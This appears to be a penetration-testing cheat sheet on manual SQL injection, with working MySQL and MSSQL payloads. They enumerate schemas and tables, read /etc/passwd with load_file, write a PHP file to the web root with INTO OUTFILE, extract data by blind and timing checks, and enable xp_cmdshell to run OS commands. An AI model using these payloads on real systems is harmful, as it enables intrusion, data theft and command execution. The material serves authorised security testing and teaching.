# Manual SQL injection

[← Foothold quick reference](../02-foothold.md)

Start by finding the query context. A quote that works in a string parameter may break a numeric or parenthesized one. Keep a true and a false request side by side so you can see which input changes the response.

## In-band checks

```sql
' AND 1=1 -- //
' AND 1=2 -- //
' ORDER BY 1-- -
' UNION SELECT NULL,NULL,NULL-- -
```

For `UNION`, match the original column count and compatible types. Move output into a column the page actually displays. The examples below assume MySQL and three columns; change them to fit the observed query.

```sql
' UNION SELECT 1,@@version,3-- -
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
```

If the database account has `FILE` access and server configuration permits the path, a file read or `INTO OUTFILE` may be possible. Confirm the target path and web server handler first:

```sql
' UNION SELECT 1,load_file('/etc/passwd'),3-- -
' UNION SELECT 1,'<?php echo "ok";?>',3 INTO OUTFILE '/var/www/html/check.php'-- -
```

## Blind checks

If the page hides the value, compare a known true condition with a known false one. For a time-based MySQL test, compare the delayed request with a baseline and repeat it before reading one character at a time.

```sql
' AND (SELECT SUBSTRING(database(),1,1))='a' -- //
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100 -- //
' AND IF(1=1, SLEEP(5), 0) -- //
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100, SLEEP(5), 0) -- //
```

## MSSQL string context

The leading `';` below closes a single-quoted value and terminates its statement. It is not a universal prefix. A numeric input needs no leading quote; a parenthesized input may need a closing `)`.

```sql
'; WAITFOR DELAY '00:00:05';-- -
1; WAITFOR DELAY '00:00:05';-- -
'); WAITFOR DELAY '00:00:05';-- -
```

Only after the query context is confirmed, inspect the login and server role. `xp_cmdshell` must already be enabled or the SQL context must have enough rights to enable it. Restore any option you changed.

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name, value, value_in_use FROM sys.configurations
WHERE name IN ('show advanced options', 'xp_cmdshell');
```

If `xp_cmdshell` is disabled and the SQL login can change it, enable it manually. Record both original values before doing so:

```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -
```

```sql
'; EXEC xp_cmdshell 'whoami';-- -
```

If both options were originally disabled, restore them when done. Otherwise, restore only the values you changed:

```sql
'; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;-- -
```

Keep one request and one response for each manual test so you can tell which change produced the result.

SQL Server option behavior: [Microsoft `xp_cmdshell` configuration](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option) and [`sys.configurations`](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-configurations-transact-sql).
